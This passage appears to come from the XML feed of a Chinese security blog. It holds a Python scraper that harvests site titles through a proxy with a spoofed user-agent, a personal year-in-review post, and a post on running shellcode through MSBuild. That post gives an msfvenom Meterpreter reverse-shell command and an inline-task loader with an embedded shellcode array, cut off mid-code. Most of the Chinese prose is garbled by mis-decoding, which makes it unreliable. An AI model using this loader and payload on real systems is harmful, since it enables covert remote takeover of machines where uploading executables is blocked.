time.sleep(0.1)            alive = False            for i in range(num_thread):                alive = alive or self.threads[i].isAlive()            if not alive:                breakdef handler(signum, frame):    global is_exit    print &quot;CTRL+C Is Pressed&quot;    sys.exit(0)if __name__ == &#39;__main__&#39;:    num_thread = 20    signal.signal(signal.SIGINT, handler)    signal.signal(signal.SIGTERM, handler)    ret = open(&quot;titles.txt&quot;, &quot;w&quot;)    ret2=open(&quot;test.txt&quot;,&#39;w&#39;)    tp = ThreadPool()    tp.new_complete()    ret.close()    ret2.close()</code></pre><p>é‡å†™æç®€ç‰ˆæœ¬ï¼š</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupres=requests.get(url)soup=BeautifulSoup(res.text,&#39;html.parser&#39;)print(soup.title.string)</code></pre><p>æœ€ç»ˆç‰ˆæœ¬ï¼š</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupimport threadpoolimport refrom signal import signal, SIGINTfrom sys import exitproxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;&#125;threads=30timeout=3def handler(signal_received, frame):    print(&#39;SIGINT or CTRL-C detected. Exiting gracefully&#39;)    exit(0)def get_urllist(file):    with open(file,&#39;r&#39;) as target:        targets=target.readlines()        return targetsdef get_title(url):    headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;    try:        res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)    except :        return &#39;Timeout&#39;    if res.apparent_encoding != None:        response=res.content.decode(res.apparent_encoding)    else:        response=res.text    try:        if &#39;mp.weixin.qq.com&#39; in url:            rule=r&quot;var msg_title = &#39;.*&#39;&quot;            title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)        else:            soup=BeautifulSoup(response,&#39;html.parser&#39;)            if soup.title:                title=str(soup.title.string)            else :                title=&#39;&#39;    except Exception as e:        print(e)        exit(0)    return titledef single_thread(url):    url=url.strip(&#39;\r\n&#39;)    result=url + &#39;\t&#39; + str(get_title(url))    print(result)    with open(&#39;result.txt&#39;,&#39;a+&#39;,encoding=&#39;utf-8&#39;) as output:        output.write(result+&#39;\n&#39;)if __name__ == &#39;__main__&#39;:    signal(SIGINT, handler)    target=get_urllist(&#39;target.txt&#39;)    pool = threadpool.ThreadPool(threads)    threading=threadpool.makeRequests(single_thread,target)    [pool.putRequest(req) for req in threading]    pool.wait()</code></pre><p>ç®€è€Œè¨€ä¹‹ï¼Œæ—©æœŸçš„ç‰ˆæœ¬ä¸å½“å‰ç‰ˆæœ¬åŒºåˆ«å¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨å¤šçº¿ç¨‹çš„æ–¹å¼æœ‰æ‰€åŒºåˆ«</li><li>è§£å†³äº†ä¸åŒç½‘é¡µç¼–ç æ ¼å¼ä¸åŒçš„é—®é¢˜</li><li>å¢åŠ äº†ä»£ç†é€‰é¡¹</li><li>è§£å†³äº†å¾®ä¿¡å…¬ä¼—è¿˜titleçˆ¬å–ä¸åˆ°çš„é—®é¢˜</li><li>è§£å†³ä¸€äº›å…¶ä»–çš„å°BUG</li><li>ä¸€äº›ä½¿ç”¨ä½“éªŒä¸Šçš„ä¼˜åŒ–</li></ul><h1 id="0x02-æ¢ç´¢å†ç¨‹"><a href="#0x02-æ¢ç´¢å†ç¨‹" class="headerlink" title="0x02 æ¢ç´¢å†ç¨‹"></a>0x02 æ¢ç´¢å†ç¨‹</h1><p>æ—©æœŸçš„ç‰ˆæœ¬å®é™…ä¸Šæ˜¯ç›´æ¥å¯¹å…¶ä»–å¤§ä½¬çš„ä»£ç åšçš„ä¿®æ”¹ï¼Œä»…ä»…åœ¨ä½¿ç”¨ä¹ æƒ¯ä¸Šåšäº†ä¸€äº›è°ƒæ•´ï¼Œä»£ç é€»è¾‘ä¹Ÿä¸ç”šäº†è§£ï¼Œäºæ˜¯ä¸€ä¸åšäºŒä¸ä¼‘ï¼Œä»é›¶å¼€å§‹é‡å†™è„šæœ¬ã€‚</p><h2 id="å‘1-å¾®ä¿¡å…¬ä¼—å·æ–‡ç« çš„Title"><a href="#å‘1-å¾®ä¿¡å…¬ä¼—å·æ–‡ç« çš„Title" class="headerlink" title="å‘1 å¾®ä¿¡å…¬ä¼—å·æ–‡ç« çš„Title"></a>å‘1 å¾®ä¿¡å…¬ä¼—å·æ–‡ç« çš„Title</h2><p>æœ€æ—©ç”¨æç®€ç‰ˆæµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°æ‰€æœ‰çš„å¾®ä¿¡å…¬ä¼—å·éƒ½æ— æ³•ç”¨bs4ç›´æ¥è·å–åˆ°titleï¼Œäºæ˜¯ä¹ç…äº†ä¸€çœ¼å…¬ä¼—å·çš„æºç ï¼Œtitleç«Ÿç„¶æ˜¯è¿™ä¸ªå±Œæ ·å­çš„â€¦â€¦</p><pre><code class="html">&lt;script&gt;    â€¦â€¦â€¦â€¦    var hd_head_img = &quot;http://xxxxxxxxxx/&quot;||&quot;&quot;;    var ori_head_img_url = &quot;http://xxxxxxxxx/&quot;;    var msg_title = &#39;è¿™é‡Œæ˜¯title&#39;.html(false);    var msg_desc = &quot;XXXXXXXXXX...&quot;;    var msg_cdn_url = &quot;http://XXXXXX/...&quot;;     â€¦â€¦â€¦â€¦&lt;/script&gt;</code></pre><p>ä¸§å¿ƒç—…ç‹‚å•Šâ€¦â€¦è¿™æ“ä½œæˆ‘æ²¡å¤ªçœ‹æ˜ç™½ï¼Œé˜²çˆ¬ï¼Ÿ</p><p>æƒ³å¤šäº†å§ã€‚</p><p>ç›´æ¥æ­£åˆ™ä¸€æŠŠæ¢­ï¼š</p><pre><code class="python">if &#39;mp.weixin.qq.com&#39; in url:    rule=r&quot;var msg_title = &#39;.*&#39;&quot;    title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)</code></pre><h2 id="å‘2-æ²¡æœ‰Title"><a href="#å‘2-æ²¡æœ‰Title" class="headerlink" title="å‘2 æ²¡æœ‰Title"></a>å‘2 æ²¡æœ‰Title</h2><p>æœ‰äº›é“¾æ¥æ˜¯æ–‡ä»¶çš„ä¸‹è½½é“¾æ¥ï¼Œæ²¡æœ‰Titleï¼Œäºæ˜¯å¼•å‘bs4æŠ¥é”™ï¼Œäºæ˜¯å¼•å‘è„šæœ¬å´©æºƒï¼Œè¿™â€¦â€¦</p><pre><code class="python">soup=BeautifulSoup(response,&#39;html.parser&#39;)if soup.title:    title=str(soup.title.string)else :    title=&#39;&#39;</code></pre><h2 id="å‘3-User-Agentè¢«æ‹¦æˆª"><a href="#å‘3-User-Agentè¢«æ‹¦æˆª" class="headerlink" title="å‘3 User-Agentè¢«æ‹¦æˆª"></a>å‘3 User-Agentè¢«æ‹¦æˆª</h2><p>æœ‰çš„é˜²æŠ¤è®¾å¤‡å±…ç„¶ä¼šä¸§å¿ƒç—…ç‹‚çš„æ‹¦æˆªrequestsçš„UAâ€¦â€¦</p><pre><code class="python">headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;try:    res=requests.get(url,headers=headers,proxies=proxies,timeout=timeout)except :    return &#39;Timeout&#39;</code></pre><h2 id="å‘4-ç¼–ç é—®é¢˜"><a href="#å‘4-ç¼–ç é—®é¢˜" class="headerlink" title="å‘4 ç¼–ç é—®é¢˜"></a>å‘4 ç¼–ç é—®é¢˜</h2><p>è¿™å…¶å®æ˜¯ä¸ªæŒºå¤´ç–¼çš„é—®é¢˜ï¼Œä¹‹å‰ç¬¬ä¸€ç‰ˆçš„è„šæœ¬å°±ä¸€ç›´æ²¡æœ‰è§£å†³ã€‚<br>ä»¥å‰è¯»å–<code>response</code>çš„å†…å®¹ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡ä¸¤ä¸ªæ–¹å¼ï¼Œ<code>res.text()</code>æˆ–è€…<code>res.content()</code>ã€‚ä½†æ˜¯è¿™æ ·æœ‰ä¸€ä¸ªå¾ˆå¤´ç–¼çš„é—®é¢˜ï¼Œå°±æ˜¯æ¯ä¸ªç½‘ç«™çš„ç¼–ç æ–¹å¼ä¸ä¸€æ ·ï¼Œå°¤å…¶ä¸­æ–‡ç½‘ç«™ï¼Œç”¨<code>GBK</code>çš„å’Œç”¨<code>UTF-8</code>çš„ç½‘ç«™å‡ ä¹ä¸€æ ·å¤šã€‚äºæ˜¯è¾“å‡ºçš„æ—¶å€™å°±æ˜¯å„ç§ä¹±ä¸ƒå…«ç³Ÿçš„ä¹±ç ï¼Œè€Œä¸€ä¸ªæ–‡ä»¶åˆä¸å¯èƒ½åŒæ—¶æœ‰ä¸¤ç§ç¼–ç æ ¼å¼ã€‚<br>ç»è¿‡è‰°(qing)éš¾(jiao)ç ”(da)ç©¶(lao)ï¼Œæœ€ç»ˆç¡®å®šäº†ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š</p><ol><li>é€šè¿‡<code>chardet</code>ç¡®å®šç¼–ç æ ¼å¼ï¼Œæœ€ç»ˆç»Ÿä¸€æˆåŒä¸€ç§ç¼–ç æ–¹å¼ï¼›</li><li>è¯»å–ç½‘é¡µ<code>response</code>å¤´ä¸­çš„ç¼–ç æ ¼å¼ï¼Œç„¶ådecodeï¼›</li></ol><p>æœ€ç»ˆæˆ‘é‡‡ç”¨çš„æ˜¯æ–¹æ¡ˆ2ï¼š</p><pre><code class="python">response = res.content.decode(res.apparent_encoding)</code></pre><p>è¿™é‡Œåˆæœ‰ä¸€ä¸ªå°å‘ï¼Œæœ‰äº›ç½‘ç«™çš„responseå¤´ä¸­ä¸ä¼šè¿”å›ç¼–ç æ ¼å¼â€¦â€¦</p><p>è¿™ç±»ç½‘ç«™å¾€å¾€éƒ½æ˜¯é»˜è®¤é‡‡ç”¨<code>UTF-8</code>æ ¼å¼ç¼–ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨<code>res.text</code>å°±å¯ä»¥äº†ï¼š</p><pre><code class="python">if res.apparent_encoding != None:    response=res.content.decode(res.apparent_encoding)else:    response=res.text</code></pre><h1 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h1><p>è¿™æ¬¡è„šæœ¬çš„ç¼–å†™è¿˜ç®—æ¯”è¾ƒé¡ºåˆ©ï¼ˆæ¯•ç«Ÿæ˜¯ä¸ªå¾ˆç®€å•çš„ä¸œè¥¿ï¼‰ï¼Œä»å¼€å§‹åˆ°è°ƒè¯•ã€å®Œå·¥ä¹Ÿä¸è¿‡èŠ±äº†ä¸¤ä¸ªå¤šå°æ—¶ï¼Œè¿˜ä¸å¦‚å†™è¿™ç¯‡æ–‡ç« èŠ±çš„æ—¶é—´å¤šï¼Œå¤§éƒ¨åˆ†æ—¶é—´éƒ½èŠ±åœ¨äº†æ»¤å‘ä¸Šé¢ã€‚ä½†æ˜¯å…¶å®è¿˜æ˜¯å¯ä»¥åˆ†æå‡ºä¸€äº›ä¸œè¥¿ï¼Œä¸€æ˜¯æœ¬äººç¡®å®ä¹…ç–æˆ˜é˜µï¼Œä¸å¤ªç†Ÿç»ƒäº†ï¼›äºŒæ¥ï¼Œå³ä¾¿æ¯”æ—©å…ˆçš„ç‰ˆæœ¬æ”¹è¿›äº†ä¸€äº›ï¼Œä½†è·ç¦»ä½œä¸ºä¸€ä¸ªæˆç†Ÿçš„å·¥å…·ï¼Œä»æœ‰è®¸å¤šå¯ä»¥æ”¹è¿›çš„åœ°æ–¹ã€‚</p><h2 id="ä»ç„¶å­˜åœ¨çš„ç¼ºé™·"><a href="#ä»ç„¶å­˜åœ¨çš„ç¼ºé™·" class="headerlink" title="ä»ç„¶å­˜åœ¨çš„ç¼ºé™·"></a>ä»ç„¶å­˜åœ¨çš„ç¼ºé™·</h2><ol><li>é­é‡æŸäº›ç¼–ç æ ¼å¼çš„ç½‘ç«™æ—¶ï¼Œä»ç„¶ä¼šæŠ¥é”™ï¼ˆå¦‚<code>cp1254</code>ç­‰ï¼‰ï¼›</li></ol><pre><code class="python">  File &quot;.\get-title.py&quot;, line 28, in get_title    response=res.content.decode(res.apparent_encoding)  File &quot;C:\Environment\Python38\lib\encodings\cp1254.py&quot;, line 15, in decode    return codecs.charmap_decode(input,errors,decoding_table)</code></pre><ol start="2"><li>å¯¹äºä¸€äº›æ¯”è¾ƒå¸¸è§çš„åçˆ¬è™«æ‰‹æ®µï¼Œæ— èƒ½ä¸ºåŠ›ï¼ˆçˆ¬åˆ°çš„titleæ˜¯<code>Just a moment...</code>ï¼Œè¯´æ˜åœ¨è‡ªåŠ¨éªŒè¯æ˜¯å¦çœŸäººè®¿é—®ï¼‰</li></ol><h2 id="å¯ä»¥æ”¹è¿›çš„æ–¹å‘"><a href="#å¯ä»¥æ”¹è¿›çš„æ–¹å‘" class="headerlink" title="å¯ä»¥æ”¹è¿›çš„æ–¹å‘"></a>å¯ä»¥æ”¹è¿›çš„æ–¹å‘</h2><ol><li>å¢åŠ ä»£ç†æ± æ¨¡å¼ï¼Œç”¨ä»¥è§£å†³éƒ¨åˆ†ç½‘ç«™TimeOutçš„é—®é¢˜ï¼›</li><li>æ›´åŠ å‹å¥½çš„ç»“æœå‘ˆç°ï¼Œå¯è¾“å‡ºè‡³Excelè¡¨æ ¼ä¸­ï¼Œæœ€å¥½èˆå¼ƒcsvé‡‡ç”¨xlsxï¼Œå› ä¸ºè·å–çš„titleåƒå¥‡ç™¾æ€ªï¼Œå¯èƒ½ç ´åcsvçš„æ ¼å¼ï¼›</li><li>è‡ªåŠ¨è¯†åˆ«ä¸€äº›å¸¸è§çš„ä¸­é—´ä»¶ï¼Œå¦‚Weblogicç­‰ç­‰ï¼›</li></ol><h1 id="0x04-2021-2-26æ›´æ–°"><a href="#0x04-2021-2-26æ›´æ–°" class="headerlink" title="0x04 2021.2.26æ›´æ–°"></a>0x04 2021.2.26æ›´æ–°</h1><pre><code class="python">import requestsfrom bs4 import BeautifulSoupimport threadpoolimport refrom signal import signal, SIGINTfrom sys import exitfrom sys import argvuse_proxy=Trueproxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;,&#39;https&#39;:&#39;http://127.0.0.1:10809&#39;&#125;# proxies=&#123;&#39;http&#39;:&#39;http://127.0.0.1:10809&#39;&#125;threads=30timeout=10result_encode_type=&#39;gb18030&#39;def handler(signal_received, frame):    print(&#39;SIGINT or CTRL-C detected. Exiting gracefully&#39;)    exit(0)def get_urllist(file):    with open(file,&#39;r&#39;) as target:        targets=target.readlines()        return targetsdef get_title(url):    if &#39;http&#39; not in url:        url = &#39;http://&#39;+url    headers = &#123;&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#39;&#125;    try:        if use_proxy:            res = requests.get(url,headers=headers,proxies=proxies,timeout=timeout)        else:            res = requests.get(url,headers=headers,timeout=timeout)    except Exception as e:        print(e)        return &#39;Timeout&#39;    if res.apparent_encoding != None:        try:            encode_type=res.apparent_encoding            response=res.content.decode(encode_type)        except:            print(&quot;#Warning# Can&#39;t decode string as ã€%sã€‘.Target URL is ã€%sã€‘.&quot; % (res.apparent_encoding,url))            response=res.text    else:        response=res.text    try:        if &#39;mp.weixin.qq.com&#39; in url:            rule=r&quot;var msg_title = &#39;.*&#39;&quot;            title=re.search(r&quot;&#39;.*&#39;&quot;,re.search(rule,response).group()).group().strip(&#39;\&#39;&#39;)        else:            soup=BeautifulSoup(response,&#39;html.parser&#39;)            if soup.title:                title=str(soup.title.string)            else :                title=&#39;&#39;    except Exception as e:        print(e)        exit(0)    return title.strip(&#39;\r\n&#39;)def single_thread(url):    url=url.strip(&#39;\r\n&#39;)    if not url:        return    result=&#39;&quot;&#39;+url + &#39;&quot;,&quot;&#39; + str(get_title(url))+&#39;&quot;&#39;    print(result)    with open(&#39;result.csv&#39;,&#39;a+&#39;,encoding=result_encode_type) as output:        output.write(result+&#39;\n&#39;)if __name__ == &#39;__main__&#39;:    if len(argv)!=2:        print(&#39;Usage:\n  python3 get-title.py [targetfile]&#39;)        exit()    target_file=argv[1]    signal(SIGINT, handler)    target=get_urllist(target_file)    pool = threadpool.ThreadPool(threads)    threading=threadpool.makeRequests(single_thread,target)    [pool.putRequest(req) for req in threading]    pool.wait()    </code></pre><ul><li>ä¼˜åŒ–äº†è¾“å‡ºæ–¹å¼ï¼Œæ”¹ä¸ºè¾“å‡ºåˆ°CSVè¡¨æ ¼ï¼›</li><li>ä¿®æ­£äº†çˆ¬HTTPSä¼šå‡ºç°é—®é¢˜çš„BUGï¼Œè¿™ä¹ˆæ˜æ˜¾çš„BUGä¸€å¼€å§‹çš„æ—¶å€™å±…ç„¶æ²¡å‘ç°â€¦â€¦</li><li>ä¿®æ­£äº†éƒ¨åˆ†ç½‘ç«™çˆ¬å–æ—¶ç¼–ç é—®é¢˜å¼‚å¸¸çš„BUGï¼›</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 - 2021</title>
      <link href="/2021/01/01/2020-2021/"/>
      <url>/2021/01/01/2020-2021/</url>
      
        <content type="html"><![CDATA[<p>æ€»ç»“ä¸€ä¸‹å§ã€‚</p><p>2020å¹´æ˜¯å¾ˆæµ‘æµŠçš„ä¸€å¹´ï¼Œç›´åˆ°æ˜¨æ™šè·¨å¹´çš„æ—¶å€™æˆ‘è¿˜æ˜¯å¾ˆæ‡µé€¼ï¼Œæ½œæ„è¯†è¿˜å®Œå…¨æ²¡æ„è¯†åˆ°2020å¹´å°±è¿™ä¹ˆè¿‡å»äº†ã€‚</p><p>è¿™ä¸€å¹´å‘ç”Ÿäº†å¾ˆå¤šçš„äº‹æƒ…ï¼Œå¯¹æˆ‘ä¸ªäººè€Œè¨€ï¼Œå¯¹è¿™ä¸ªä¸–ç•Œè€Œè¨€ï¼Œéƒ½æ˜¯å¦‚æ­¤ã€‚è¿™ä¸­é—´çš„å…±åŒç‚¹æ˜¯ï¼Œä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆäº‹æƒ…æ˜¯æ¯”è¾ƒå®Œæ»¡çš„ã€‚ä½†è¿™ä¸€ç¯‡å¹¶ä¸æ˜¯å›å¿†å½•ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿä¸æ‰“ç®—åƒæ”¶æ‹¾æŠ½å±‰ä¸€æ ·æŠŠå®ƒä»¬ä¸€ä»¶ä¸€ä»¶å †å èµ·æ¥ã€‚æ¡ä¸€äº›æƒ³è¯´çš„è¯´å§ã€‚</p><hr><hr><p>è¯´èµ·æ¥ï¼Œå½“åˆé€‰æ‹©ç½‘ç»œå®‰å…¨æ–¹å‘çš„åˆè¡·ï¼Œå…¶å®æ˜¯å¸Œæœ›å­¦ä¹ ä¸€äº›é»‘å®¢æŠ€æœ¯ï¼Œä»¥ä¾¿èƒ½å¤Ÿçœ‹åˆ°å±é—­äº†æˆ‘çš„å¦¹å­çš„QQç©ºé—´ã€‚</p><p>è¿™ä¸ªç›®æ ‡è‡³ä»Šæ²¡æœ‰è¾¾æˆã€‚</p><p>è€Œä¸”æ—¶è¿‡å¢ƒè¿ï¼Œç°åœ¨ä¹Ÿæ²¡æœ‰å¤šå°‘äººç©QQäº†ã€‚</p><hr><p>æ„è¯†åˆ°è¿™ä¸ªç›®æ ‡æˆä¸ºæ³¡å½±ä¹‹åï¼Œæˆ‘æƒ³è¿‡å¾ˆå¤šæ¬¡ï¼Œä¸ºä»€ä¹ˆè¦ç•™åœ¨è¿™ä¸ªè¡Œä¸šã€‚ç­”æ¡ˆæ˜¯ï¼Œå› ä¸ºå…´è¶£ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªä»…ä»…é€šè¿‡æŠ€æœ¯ï¼Œå°±å¯ä»¥è·å¾—æœ€åŸå§‹ã€æœ€çº¯ç²¹çš„æˆå°±æ„Ÿçš„è¡Œä¸šã€‚ä¿¡æ¯å®‰å…¨æ˜¯ä¸€ä¸ªå¾ˆå¹¿è¢¤çš„å®šä¹‰ï¼Œä»å¼€é”ã€åˆ°æ¬ºéª—ã€åˆ°0Dayï¼Œå¥½åƒä»€ä¹ˆä¸œè¥¿éƒ½èƒ½æ¶µç›–åˆ°ä¿¡æ¯å®‰å…¨çš„å®šä¹‰é‡Œé¢ï¼Œä½ å¯ä»¥å¾ˆè½»æ˜“åœ°åœ¨é‡Œé¢æ‰¾åˆ°ä½ æ„Ÿå…´è¶£çš„ä¸œè¥¿ã€‚è€Œæˆ‘æœ¬äººï¼Œæ­£å¦‚<a href="https://7mitu.github.io/about/">ä¸ªäººæè¿°</a>é‡Œè¯´çš„é‚£æ ·ï¼Œå–œæ¬¢æ¯ä¸ªæŠ€èƒ½éƒ½ç‚¹ä¸€ä¸‹ï¼Œä¼ ç»ŸåŠŸå¤«è®²ç©¶ç‚¹åˆ°ä¸ºæ­¢ï¼ˆä¸æ˜¯ï¼‰ã€‚</p><hr><p>è¿™ä¸€å¹´æ¥å…¶å®å¾ˆè‹¦æ¼ï¼Œæˆ‘ç›®å‰çš„æŠ€æœ¯æ°´å¹³ä¹Ÿå°±ç®—ä¸ªTï¼Œä½†æ˜¯å‘¨å›´æ‰€æœ‰äººå¥½åƒéƒ½åœ¨è°ˆAPTã€‚</p><p>é¥¶æ˜¯æˆ‘è¿™é’›åˆé‡‘è„¸çš®ä¹Ÿé­ä¸ä½å¤©å¤©é¢éƒ¨åˆ®ç—§å‘€ã€‚</p><hr><p>å¸Œæœ›2021å¹´ï¼š</p><ul><li>ç–«æƒ…æ—©æ—¥ç»“æŸ</li><li>æ‰¾åˆ°è‡ªå·±æƒ³è¦çš„æ˜¯ä»€ä¹ˆ</li><li>é’»ç ”æŠ€æœ¯</li><li>è¿œç¦»ä¸€äº›è™šä¼ª</li><li>æ‰¾ä¸ªå¥³æœ‹å‹</li></ul><hr><p>ä»¥ä¸Šã€‚</p><p><img src="/2021/01/01/2020-2021/backiee-114501.jpg" alt="backiee-114501"></p>]]></content>
      
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨.Net FrameworkåŠ è½½Shellcode</title>
      <link href="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/"/>
      <url>/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-åœºæ™¯"><a href="#0x00-åœºæ™¯" class="headerlink" title="0x00 åœºæ™¯"></a>0x00 åœºæ™¯</h3><ul><li>Windowsæ“ä½œç³»ç»Ÿ</li><li>å­˜åœ¨.Net Frameworkç¯å¢ƒ</li><li>æ— æ³•ä¸Šä¼ exeç­‰å¯æ‰§è¡Œæ–‡ä»¶</li></ul><h3 id="0x01-ç”Ÿæˆè½½è·"><a href="#0x01-ç”Ÿæˆè½½è·" class="headerlink" title="0x01 ç”Ÿæˆè½½è·"></a>0x01 ç”Ÿæˆè½½è·</h3><p>è¿™é‡Œä»¥MSF Meterpreterè½½è·ä¸ºä¾‹ï¼Œé¦–å…ˆç”ŸæˆShellcodeï¼š</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.86.133 LPORT=2333 -f csharp</code></pre><p><img src="/2020/12/28/%E5%88%A9%E7%94%A8-Net-Framework%E5%8A%A0%E8%BD%BDShellcode/image-20201228133105384.png" alt="image-20201228133105384"></p><p>åˆ¶ä½œMSBuildè½½è·ï¼Œå°†ç”Ÿæˆçš„Shellcodeç²˜è´´åœ¨ä¸‹æ–¹ä»£ç çš„<code>shellcode</code>å˜é‡ä¸­ï¼Œå¹¶ä¿å­˜ä¸ºæ–‡ä»¶<code>bad.xml</code>ï¼š</p><pre><code class="xml">&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;         &lt;!-- This inline task executes shellcode. --&gt;         &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt;         &lt;!-- Save This File And Execute The Above Command --&gt;         &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt;         &lt;!-- License: BSD 3-Clause --&gt;      &lt;Target Name=&quot;Hello&quot;&gt;        &lt;ClassExample /&gt;      &lt;/Target&gt;      &lt;UsingTask        TaskName=&quot;ClassExample&quot;        TaskFactory=&quot;CodeTaskFactory&quot;        AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;        &lt;Task&gt;                  &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;          &lt;![CDATA[        using System;        using System.Runtime.InteropServices;        using Microsoft.Build.Framework;        using Microsoft.Build.Utilities;        public class ClassExample :  Task, ITask        &#123;                   private static UInt32 MEM_COMMIT = 0x1000;                    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;                    [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);                    [DllImport(&quot;kernel32&quot;)]            private static extern IntPtr CreateThread(                        UInt32 lpThreadAttributes,            UInt32 dwStackSize,            UInt32 lpStartAddress,            IntPtr param,            UInt32 dwCreationFlags,            ref UInt32 lpThreadId                       );          [DllImport(&quot;kernel32&quot;)]            private static extern UInt32 WaitForSingleObject(                       IntPtr hHandle,            UInt32 dwMilliseconds            );                    public override bool Execute()          &#123;            //replace with your own shellcode            byte[] shellcode = new byte[] &#123; 0x33,0xc9,0x83,0xe9,0xaa,0xe8,0xff,0xff,0xff,0xff,0xc0,0x5e,0x81,0x76,0x0e,0x1c,0xb8,0xf2,0x6e,0x83,0xee,0xfc,0xe2,0xf4,0xe0,0x50,0x70,0x6e,0x1c,0xb8,0x92,0xe7,0xf9,0x89,0x32,0x0a,0x97,0xe8,0xc2,0xe5,0x4e,0xb4,0x79,0x3c,0x08,0x33,0x80,0x46,0x13,0x0f,0xb8,0x48,0x2d,0x47,0x5e,0x52,0x7d,0xc4,0xf0,0x42,0x3c,0x79,0x3d,0x63,0x1d,0x7f,0x10,0x9c,0x4e,0xef,0x79,0x3c,0x0c,0x33,0xb8,0x52,0x97,0xf4,0xe3,0x16,0xff,0xf0,0xf3,0xbf,0x4d,0x33,0xab,0x4e,0x1d,0x6b,0x79,0x27,0x04,0x5b,0xc8,0x27,0x97,0x8c,0x79,0x6f,0xca,0x89,0x0d,0xc2,0xdd,0x77,0xff,0x6f,0xdb,0x80,0x12,0x1b,0xea,0xbb,0x8f,0x96,0x27,0xc5,0xd6,0x1b,0xf8,0xe0,0x79,0x36,0x38,0xb9,0x21,0x08,0x97,0xb4,0xb9,0xe5,0x44,0xa4,0xf3,0xbd,0x97,0xbc,0x79,0x6f,0xcc,0x31,0xb6,0x4a,0x38,0xe3,0xa9,0x0f,0x45,0xe2,0xa3,0x91,0xfc,0xe7,0xad,0x34,0x97,0xaa,0x19,0xe3,0x41,0xd0,0xc1,0x5c,0x1c,0xb8,0x9a,0x19,0x6f,0x8a,0xad,0x3a,0x74,0xf4,0x85,0x48,0x1b,0x31,0x1a,0x91,0xcc,0x00,0x62,0x6f,0x1c,0xb8,0xdb,0xaa,0x48,0xe8,0x9a,0x47,0x9c,0xd3,0xf2,0x91,0xc9,0xd2,0xf8,0x06,0xdc,0x10,0xa4,0xeb,0x74,0xba,0xf2,0x67,0x01,0x31,0x14,0x3e,0x4c,0xe8,0xa2,0x2e,0x4c,0xf8,0xa2,0x06,0xf6,0xb7,0x2d,0x8e,0xe3,0x6d,0x65,0x04,0x0c,0xee,0xa5,0x06,0x85,0x1d,0x86,0x0f,0xe3,0x6d,0x77,0xae,0x68,0xb2,0x0d,0x20,0x14,0xcd,0x1e,0x86,0x7b,0xb8,0xf2,0x6e,0x76,0xb8,0x98,0x6a,0x4a,0xef,0x9a,0x6c,0xc5,0x70,0xad,0x91,0xc9,0x3b,0x0a,0x6e,0x62,0x8e,0x79,0x58,0x76,0xf8,0x9a,0x6e,0x0c,0xb8,0xf2,0x38,0x76,0xb8,0x9a,0x36,0xb8,0xeb,0x17,0x91,0xc9,0x2b,0xa1,0x04,0x1c,0xee,0xa1,0x39,0x74,0xba,0x2b,0xa6,0x43,0x47,0x27,0xed,0xe4,0xb8,0x8f,0x46,0x44,0xd0,0xf2,0x2e,0x1c,0xb8,0x98,0x6e,0x4c,0xd0,0xf9,0x41,0x13,0x88,0x0d,0xbb,0x4b,0xd0,0x87,0x00,0x51,0xd9,0x0d,0xbb,0x42,0xe6,0x0d,0x62,0x38,0xb7,0x77,0x1e,0xe3,0x47,0x0d,0x87,0x87,0x47,0x0d,0x91,0x1d,0x7b,0xdb,0xa8,0x69,0x79,0x31,0xd5,0xec,0x0d,0x50,0x38,0x76,0xb8,0xa1,0x91,0xc9,0xb8,0xf2,0x6e &#125;;                            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,            MEM_COMMIT, PAGE_EXECUTE_READWRITE);              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);              IntPtr hThread = IntPtr.Zero;              UInt32 threadId = 0;              IntPtr 